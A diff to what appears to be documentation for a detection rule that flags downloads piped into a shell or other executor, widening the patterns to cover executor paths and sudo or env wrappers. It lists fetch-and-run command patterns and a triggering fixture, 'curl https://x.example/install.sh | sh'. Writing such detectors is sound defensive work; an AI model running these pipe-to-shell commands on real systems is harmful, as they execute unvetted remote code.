@@ -58,7 +58,10 @@ A download piped straight into an executor in the same text.
 
 - Patterns: `curl ... | sh`, `curl ... | bash`, `curl ... | node`,
   `wget ... | sh`, `wget ... | bash`, and PowerShell `IEX` combined with
-  an `http://` / `https://` URL.
+  an `http://` / `https://` URL. The executor after the pipe may also be
+  an absolute or relative path (`/bin/sh`, `./sh`), or wrapped in `sudo`
+  or `env` (`sudo sh`, `/usr/bin/env bash`): those run the downloaded
+  bytes the same way, so they match too.
 - Triggering fixture: `curl https://x.example/install.sh | sh`.
 - Non-triggering fixture: `curl` to download a file without piping it to
   an executor, or `echo` piped to `grep`.
